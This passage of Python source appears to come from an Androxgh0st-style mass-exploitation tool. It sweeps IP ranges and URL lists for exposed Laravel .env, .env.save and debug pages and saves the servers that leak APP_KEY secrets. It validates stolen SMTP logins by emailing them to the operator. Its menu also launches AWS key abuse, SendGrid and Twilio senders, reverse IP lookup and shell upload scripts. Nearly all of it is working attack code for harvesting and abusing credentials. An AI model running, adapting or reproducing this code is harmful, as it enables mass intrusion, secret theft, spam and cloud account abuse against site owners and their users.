    ip2 = ipto.strip().split('.')
    cur = ipstart.strip().split('.')

    rip0 =int(ip1[0])
    rip1 =int(ip1[1])
    rip2 =int(ip1[2])
    rip3 =int(ip1[3])-1
    finalip = 0
    while finalip != ipto:
      rip3 +=1
      finalip = str(rip0)+"."+str(rip1)+"."+str(rip2)+"."+str(rip3)
      dorkscan(finalip)
      if rip2 != int(ip2[2])+1 and rip3 == int(ip2[3]):
        rip2 +=1
        rip3 = int(ip1[3]) - 1
      elif rip1 != int(ip2[1]) and rip2 == int(ip2[2]):
        rip1 +=1
        rip2 = int(ip1[2])
        rip3 = int(ip1[3]) - 1
      elif rip0 != int(ip2[0]) and rip1 == int(ip2[1]):
        rip0 +=1
        rip1 =int(ip1[1])
        rip2 = int(ip1[2])
        rip3 = int(ip1[3]) - 1

def nowayngntd2():

  Targetssa = input("\033[1;37;40mInput Your List : ") #for date
  ip_list = open(Targetssa, 'r').read().split('\n')
  for sites in ip_list:
    if 'http' not in sites:
      site = 'http://'+sites

      prepare2(site)
    else:
      prepare2(sites)



def makethread2(jumlah):
  try:
    nam = input("\033[1;37;40mInput Your List : ") #for date
    th = int(jumlah)
    time.sleep(3)
    liss = [ i.strip() for i in open(nam, 'r').readlines() ]
    zm = Pool(th)
    zm.map(jembotngw2, liss)
  except Exception as e:
    pass


def makethread29(jumlah):
  try:
    nam = input("\033[1;37;40mInput Your List : ") #for date
    th = int(jumlah)
    time.sleep(3)
    liss = [ i.strip() for i in open(nam, 'r').readlines() ]
    zm = Pool(th)
    zm.map(exploit, liss)
  except Exception as e:
    pass



def checkweb(url):
    headers = {'User-agent':'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30'}
    ori = 'http://'+url
    try:
        get_source = requests.get('http://'+url+'/.env', headers=headers, timeout=1, verify=False, allow_redirects=False).text
        if "APP_KEY" in str(get_source):
            with lock:
                print('\033[93m'+url +" => \033[92mGood | .env")
                live = open('Result/good ips.txt', 'a')
                live.write(str(ori)+ '\n')
                
                live2 = open('Result/good env.txt', 'a')
                live2.write(str(ori)+'/.env'+ '\n')
                live.close()
                live2.close()
        else:
                get_source3 = requests.post('http://'+url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=1, verify=False, allow_redirects=False).text
                if "<td>APP_KEY</td>" in get_source3:
                    with lock:
                        print('\033[93m'+url +" => \033[92mGood | .debug")
                    live = open('Result/good ips.txt', 'a')
                    live.write(str(ori)+ '\n')
                    live2 = open('Result/good debug.txt', 'a')
                    live2.write(str(ori)+ '\n')
                    live.close()
                    live2.close()
                else:
                    get_source5 = requests.get('https://'+url+'/.env', headers=headers, timeout=1, verify=False, allow_redirects=False).text
                    if "APP_KEY" in str(get_source5):
                        with lock:
                            print('\033[93m'+url +" => \033[92mGood | .env")
                            live = open('Result/good ips.txt', 'a')
                            live.write(str(ori)+ '\n')
                            live2 = open('Result/good env.txt', 'a')
                            live2.write(str(ori)+'/.env'+ '\n')
                            live.close()
                            live2.close()
                    else:
                            get_source6 = requests.post('https://'+url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=1, verify=False, allow_redirects=False).text
                            if "<td>APP_KEY</td>" in get_source6:
                                with lock:
                                    print('\033[93m'+url +" => \033[92mGood | .debug")
                                live = open('Result/good ips.txt', 'a')
                                live.write(str(ori)+ '\n')
                                live2 = open('Result/good debug.txt', 'a')
                                live2.write(str(ori)+ '\n')
                                live.close()
                                live2.close()
                            else:
                                with lock:
                                    print('\033[93m'+url +" => \033[91mBad")
                        
            
    except:
        with lock:
            print('\033[93m'+url +" => \033[91mBad")
        pass

def checkweb2(url):
    headers = {'User-agent':'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30'}
    ori = 'http://'+url
    try:
        get_source = requests.get('http://'+url+'/.env', headers=headers, timeout=1, verify=False, allow_redirects=False).text
        if "APP_KEY" in str(get_source):
            with lock:
                print('\033[93m'+url +" => \033[92mGood | .env")
                live = open('Result/good ips.txt', 'a')
                live.write(str(ori)+ '\n')
                live2 = open('Result/good env.txt', 'a')
                live2.write(str(ori)+'/.env'+ '\n')
                dorkscan(url)
        else:
          get_source3 = requests.post('http://'+url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=1, verify=False, allow_redirects=False).text
          if "<td>APP_KEY</td>" in get_source3:
              with lock:
                  print('\033[93m'+url +" => \033[92mGood | .debug")
              live = open('Result/good ips.txt', 'a')
              live.write(str(ori)+ '\n')
              live2 = open('Result/good debug.txt', 'a')
              live2.write(str(ori)+ '\n')
              dorkscan(url)
          else:
              get_source5 = requests.get('https://'+url+'/.env', headers=headers, timeout=1, verify=False, allow_redirects=False).text
              if "APP_KEY" in str(get_source5):
                  with lock:
                      print('\033[93m'+url +" => \033[92mGood | .env")
                      live = open('Result/good ips.txt', 'a')
                      live.write(str(ori)+ '\n')
                      live2 = open('Result/good env.txt', 'a')
                      live2.write(str(ori)+'/.env'+ '\n')
                      dorkscan(url)
              else:
                  get_source6 = requests.post('https://'+url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=1, verify=False, allow_redirects=False).text
                  if "<td>APP_KEY</td>" in get_source6:
                      with lock:
                          print('\033[93m'+url +" => \033[92mGood | .debug")
                      live = open('Result/good ips.txt', 'a')
                      live.write(str(ori)+ '\n')
                      live2 = open('Result/good debug.txt', 'a')
                      live2.write(str(ori)+ '\n')
                      dorkscan(url)
                  else:
                      with lock:
                          print('\033[93m'+url +" => \033[91mBad")

    except:
        with lock:
            print('\033[93m'+url +" => \033[91mBad")
        pass

def checkweb3(url):
    headers = {'User-agent':'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30'}
    ori = 'http://'+url
    try:
        get_source = requests.get('http://'+url+'/.env', headers=headers, timeout=1, verify=False, allow_redirects=False).text
        if "APP_KEY" in str(get_source):
            with lock:
                print('\033[93m'+url +" => \033[92mGood | .env")
                live = open('Result/good ips.txt', 'a')
                live.write(str(ori)+ '\n')
                live2 = open('Result/good env.txt', 'a')
                live2.write(str(ori)+'/.env'+ '\n')
                dorkscansave(url)
        else:
          get_source3 = requests.post('http://'+url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=1, verify=False, allow_redirects=False).text
          if "<td>APP_KEY</td>" in get_source3:
              with lock:
                  print('\033[93m'+url +" => \033[92mGood | .debug")
              live = open('Result/good ips.txt', 'a')
              live.write(str(ori)+ '\n')
              live2 = open('Result/good debug.txt', 'a')
              live2.write(str(ori)+ '\n')
              dorkscansave(url)
          else:
              get_source5 = requests.get('https://'+url+'/.env', headers=headers, timeout=1, verify=False, allow_redirects=False).text
              if "APP_KEY" in str(get_source5):
                  with lock:
                      print('\033[93m'+url +" => \033[92mGood | .env")
                      live = open('Result/good ips.txt', 'a')
                      live.write(str(ori)+ '\n')
                      live2 = open('Result/good env.txt', 'a')
                      live2.write(str(ori)+'/.env'+ '\n')
                      dorkscansave(url)
              else:
                  get_source6 = requests.post('https://'+url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=1, verify=False, allow_redirects=False).text
                  if "<td>APP_KEY</td>" in get_source6:
                      with lock:
                          print('\033[93m'+url +" => \033[92mGood | .debug")
                      live = open('Result/good ips.txt', 'a')
                      live.write(str(ori)+ '\n')
                      live2 = open('Result/good debug.txt', 'a')
                      live2.write(str(ori)+ '\n')
                      dorkscansave(url)
                  else:
                      get_source6 = requests.get('http://'+url+'/.env.save', headers=headers, timeout=1, verify=False, allow_redirects=False).text
                      if "APP_KEY" in str(get_source6):
                        with lock:
                            print('\033[93m'+url +" => \033[92mGood | .env.save")
                            live = open('Result/good ips.txt', 'a')
                            live.write(str(ori)+ '\n')
                            live2 = open('Result/good env-save.txt', 'a')
                            live2.write(str(ori)+'/.env.save'+ '\n')
                            dorkscansave(url)
                      else:
                        with lock:
                            print('\033[93m'+url +" => \033[91mBad")

    except:
        with lock:
            print('\033[93m'+url +" => \033[91mBad")
        pass

threads17 = []
threads18 = []
threads19 = []
threads20 = []
threads22 = []

def sendsmtptest(host,port,user,passw,sender):
        
        if "465" in str(port):
          port = "587"
        else:
          port = str(port)

        if "unknown@unknown.com" in sender and "@" in user:
          sender_email = user
        else:
          sender_email = str(sender.replace('\"',''))

        smtp_server = str(host)
        login = str(user.replace('\"',''))
        password = str(passw.replace('\"',''))
        # specify the sender’s and receiver’s email addresses

        receiver_email = str(fsetting)
        # type your message: use two newlines (\n) to separate the subject from the message body, and use 'f' to  automatically insert variables in the text
        message = MIMEMultipart("alternative")
        message["Subject"] = "| HOST: "+str(host)
        if "zoho" in host:
          message["From"] = user
        else:
          message["From"] = sender_email
        message["To"] = receiver_email
        text = """\
        """
        # write the HTML part
        html = f"""\
        <html>
          <body>
              <p>-------------------</p>
              <p>HOST   : {host}</p>
              <p>PORT   : {port}</p>
              <p>USER   : {user}</p>
              <p>PASSW  : {passw}</p>
              <p>SENDER : {sender}</p>
              <p>-------------------</p>
          </body>
        </html>
        """
        part1 = MIMEText(text, "plain")
        part2 = MIMEText(html, "html")
        message.attach(part1)
        message.attach(part2)

        try:
          s = smtplib.SMTP(smtp_server, port)
          s.connect(smtp_server,port)
          s.ehlo()
          s.starttls()
          s.ehlo()
          s.login(login, password)
          s.sendmail(sender_email, receiver_email, message.as_string())
          with lock:
            print(bcolors.OKGREEN + user +' | [SMTP SEND INFO] [GOOD] Sent To '+str(fsetting))
            live = io.open('Result/smtptest/good.txt', 'a')
            live.write(str(host)+ '|' + str(port+'|'+str(user)+'|'+str(passw)+'|'+str(sender))+'\n')
        except (gaierror, ConnectionRefusedError):
            with lock:
                print(bcolors.FAIL + user +' | [SMTP SEND INFO] [BAD] Failed to connect to the server. Bad connection settings?')
                bad = io.open('Result/smtptest/bad.txt', 'a')
                bad.write(str(host)+ '|' + str(port+'|'+str(user)+'|'+str(passw)+'|'+str(sender))+'\n')
        except smtplib.SMTPServerDisconnected:
            with lock:
                print(bcolors.FAIL+ user +' | [SMTP SEND INFO] [BAD] Failed to connect to the server. Wrong user/password?')
                bad = io.open('Result/smtptest/bad.txt', 'a')
                bad.write(str(host)+ '|' + str(port+'|'+str(user)+'|'+str(passw)+'|'+str(sender))+'\n')
        except smtplib.SMTPException as e:
            with lock:
                print(bcolors.FAIL+ user +' | [SMTP SEND INFO] [BAD] SMTP error occurred: ' + str(e))
                bad = io.open('Result/smtptest/bad.txt', 'a')
                bad.write(str(host)+ '|' + str(port+'|'+str(user)+'|'+str(passw)+'|'+str(sender))+'\n')


def makethread17(jumlah):
  try:
    global threads17
    print("""input your ip range ex Start ips = 3.1.1.1 to ips 3.253.253.253""")
    ipsmin = input("Start Ips : ")
    ipsmax = input("To Ips: ")
    th = int(jumlah)
    time.sleep(3)
    start_ip = ipaddress.IPv4Address(ipsmin)
    end_ip = ipaddress.IPv4Address(ipsmax)
    for ip_int in range(int(start_ip), int(end_ip)):
        # print(ipaddress.IPv4Address(ip_int))
        ip = str(ipaddress.IPv4Address(ip_int))
        thread = threading.Thread(target=checkweb , args=(ip,))
        threads17.append(thread)
        thread.start()
        if len(threads17) == th:
            for i in threads17:
                i.join()
            threads17 = []

  except Exception as e:
    pass

def makethread18(jumlah):
  try:
    global threads18
    print("""input your ip range ex Start ips = 3.1.1.1 to ips 3.253.253.253""")
    ipsmin = input("Start Ips : ")
    ipsmax = input("To Ips: ")
    th = int(jumlah)
    time.sleep(3)
    start_ip = ipaddress.IPv4Address(ipsmin)
    end_ip = ipaddress.IPv4Address(ipsmax)
    for ip_int in range(int(start_ip), int(end_ip)):
        # print(ipaddress.IPv4Address(ip_int))
        ip = str(ipaddress.IPv4Address(ip_int))
        url = ip
        thread = threading.Thread(target=checkweb2 , args=(url,))
        threads18.append(thread)
        thread.start()
        if len(threads18) == th:
            for i in threads18:
                i.join()
            threads18 = []

  except Exception as e:
    pass

def makethread19(jumlah):
  try:
    global threads19
    th = int(jumlah)
    iplist= input("""
    input your email to sendto.ini first for receive valid smtp
    Format : host|port|user|password|fromemail(optional)
    valid smtp will save in smtptest folder in result
    Input Smtp lists file: """)
    lists = open(iplist, 'r').read().split('\n')
    for alist in lists:
        try:
            host,port,user,passw,fromw = alist.split('|')
        except Exception as e:
            print(e) 
            continue
        thread = threading.Thread(target=sendsmtptest , args=(host,port,user,passw,fromw))
        threads19.append(thread)
        thread.start()
        if len(threads19) == th:
            for i in threads19:
                i.join()
            threads19 = []

  except Exception as e:
    pass

def makethread20(jumlah):
  try:
    global threads20
    th = int(jumlah)
    iplist2= input("Input iplist file: ")
    lists = open(iplist2, 'r').read().split('\n')
    for alist in lists:
        try:
            ipss = alist.split('|')
        except Exception as e:
            print(e)
            continue
        thread = threading.Thread(target=reverseip , args=(ipss))
        threads20.append(thread)
        thread.start()
        if len(threads20) == th:
            for i in threads20:
                i.join()
            threads20 = []

  except Exception as e:
    pass

def makethread22(jumlah):
  try:
    global threads22
    print("""input your ip range ex Start ips = 3.1.1.1 to ips 3.253.253.253""")
    ipsmin = input("Start Ips : ")
    ipsmax = input("To Ips: ")
    th = int(jumlah)
    time.sleep(3)
    start_ip = ipaddress.IPv4Address(ipsmin)
    end_ip = ipaddress.IPv4Address(ipsmax)
    for ip_int in range(int(start_ip), int(end_ip)):
        # print(ipaddress.IPv4Address(ip_int))
        ip = str(ipaddress.IPv4Address(ip_int))
        url = ip
        thread = threading.Thread(target=checkweb3 , args=(url,))
        threads22.append(thread)
        thread.start()
        if len(threads22) == th:
            for i in threads18:
                i.join()
            threads22 = []

  except Exception as e:
    print(e)

def cracksespisah():
  nam = input("\033[1;37;40mInput AWS KEY List : ") #for date
  lista = open(nam, 'r').read().split('\n')
  totalnum = len(lista)
  print('[X] Threads Number  : ' , end='')

  threadnum = int(input())

  threads = []

  for i in lista:
    try:
        ACCESS_KEY,SECRET_KEY,REGION = i.split('|')
        thread = threading.Thread(target=autocreate , args=(ACCESS_KEY.strip(),SECRET_KEY.strip(),REGION.strip()))
        threads.append(thread)
        thread.start()
        if len(threads) == threadnum:
            for i in threads:
                i.join()
                threads = []
    except:
        continue



def cinxx():
  try:
    menucit()
    Targetssad = input("\033[1;37;40mChoice : ") #for date
    if Targetssad == "1":

      Targetssas = input("\033[1;37;40mWith thread or no [y/n] : ") #for date
      if Targetssas == "y":
        jumlahkn = input("\033[1;37;40mThread : ") #for date
        makethread(jumlahkn)
      else:
        nowayngntd()
    elif Targetssad == "3":
      Targetssas = input("\033[1;37;40mWith thread or no [y/n] : ") #for date
      if Targetssas == "y":
        jumlahkn = input("\033[1;37;40mThread : ") #for date
        makethread3(jumlahkn)
      else:
        makethread3(1)
    elif Targetssad == "4":
      Targetssas = input("\033[1;37;40mWith thread or no [y/n] : ") #for date
      if Targetssas == "y":
        jumlahkn = input("\033[1;37;40mThread : ") #for date
        makethread4(jumlahkn)
      else:
        makethread4(1)
    elif Targetssad == "5":
      makethread5()
      
    elif Targetssad == "6":
      makethread6()
    elif Targetssad == "7":
      autodork()
    elif Targetssad == "8":
      makethread8()
    elif Targetssad == "9":
      makethread9()
    elif Targetssad == "10":
      clean()
    elif Targetssad == "11":
      awskey = input("AWS KEY : ") #for date
      seckey = input("SECRET KEY : ") #for date
      reg = input("REGION : ") #for date
      awslimitcheck(awskey,seckey,reg)
    elif Targetssad == "12":
      cracksespisah()
    elif Targetssad == "13":
      twillio_sender()
    elif Targetssad == "14":
      makethread14()
    elif Targetssad == "15":
      print('[X] TOTAL KEY  : ' , end='')
      totalkey = int(input())
      i = 0
      while i < totalkey:
          i+=1
          print_key_sendgrid()
    elif Targetssad == "17":
      Targetssas = input("\033[1;37;40mWith thread or no [y/n] : ") #for date
      if Targetssas == "y":
        jumlahkn = input("\033[1;37;40mThread : ") #for date
        makethread17(jumlahkn)
      else:
        makethread17(1)
    elif Targetssad == "18":
      Targetssas = input("\033[1;37;40mWith thread or no [y/n] : ") #for date
      if Targetssas == "y":
        jumlahkn = input("\033[1;37;40mThread : ") #for date
        makethread18(jumlahkn)
      else:
        makethread18(1)
    elif Targetssad == "19":
      Targetssas = input("\033[1;37;40mWith thread or no [y/n] : ") #for date
      if Targetssas == "y":
        jumlahkn = input("\033[1;37;40mThread : ") #for date
        makethread19(jumlahkn)
      else:
        makethread19(1)
    elif Targetssad == "20":
      Targetssas = input("\033[1;37;40mWith thread or no [y/n] : ") #for date
      if Targetssas == "y":
        jumlahkn = input("\033[1;37;40mThread : ") #for date
        makethread20(jumlahkn)
      else:
        makethread20(1)
    elif Targetssad == "22":
      Targetssas = input("\033[1;37;40mWith thread or no [y/n] : ") #for date
      if Targetssas == "y":
        jumlahkn = input("\033[1;37;40mThread : ") #for date
        makethread22(jumlahkn)
      else:
        makethread22(1)
    elif Targetssad == "16":
      print('[X] TOTAL KEY  : ' , end='')
      totalkey = int(input())
      print('[X] REGION (ex: us-east-1) : ' , end='')
      region = str(input())
      i = 0
      while i < totalkey:
          i+=1
          print_key_aws(region)    
    elif Targetssad == "2":
      Targetssas = input("\033[1;37;40mWith thread or no [y/n] : ") #for date
      if Targetssas == "y":
        jumlahkn = input("\033[1;37;40mThread : ") #for date
        makethread2(jumlahkn)
      else:
        nowayngntd2()
    elif Targetssad == "24":
       os.system('cmd /k "py shellupload.py"')
    elif Targetssad == "25":
       os.system('cmd /k "py database.py ip.txt"') 
    elif Targetssad == "26":
       os.system('cmd /k "perl script.pl -u 2.txt -t 10"')       
    elif Targetssad == "27":
       os.system('cmd /k "py nexmo.py"') 
    elif Targetssad == "28":
       os.system('cmd /k "py reformat.py"')
    elif Targetssad == "29":
      Targetssas = input("\033[1;37;40mWith thread or no [y/n] : ") #for date
      if Targetssas == "y":
        jumlahkn = input("\033[1;37;40mThread : ") #for date
        makethread29(jumlahkn)
    elif Targetssad == "30":
       os.system('cmd /k "py woo.py"')        
    else:
      if os.name == "nt":
        os.system("cls")
      else:
        os.system("clear")
      logo()
      cinxx()

  except KeyboardInterrupt as e:
    print("Exit Program")
    sys.exit()

def computeMD5hash(my_string):
    m = hashlib.md5()
    m.update(my_string.encode('utf-8'))
    return m.hexdigest()


cinxx()
